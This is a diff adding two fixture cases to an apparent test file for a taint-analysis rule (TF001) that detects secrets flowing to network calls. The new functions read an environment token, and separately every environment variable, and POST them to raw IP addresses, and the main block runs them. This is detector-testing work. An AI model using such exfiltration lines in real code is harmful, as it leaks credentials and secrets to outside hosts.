@@ -107,6 +107,20 @@ def v11_lambda_body():
     return upload
 
 
+def v12_walrus_binding():
+    # secret bound by a walrus (:=) — the taint pass must enumerate NamedExpr, not just
+    # Assign (Codex audit; the binding-construct disease, not the walrus instance) -> TF001
+    if (tok := os.environ["WALRUS_TOKEN"]):
+        requests.post("https://8.8.8.9/w", data=tok)
+
+
+def v13_for_target():
+    # secret element of a tainted iterable bound by a for-target -> TF001 (the sibling
+    # of the walrus fix: every binding construct, not just Assign)
+    for v in os.environ.values():
+        requests.post("https://93.184.216.35/f", data=v)
+
+
 if __name__ == "__main__":
     v1_container_public_ip()
     v2_user_controlled_url(sys.argv[1])
@@ -121,3 +135,5 @@ if __name__ == "__main__":
     v9_whole_environment_dump()
     v10_match_case_body()
     v11_lambda_body()
+    v12_walrus_binding()
+    v13_for_target()
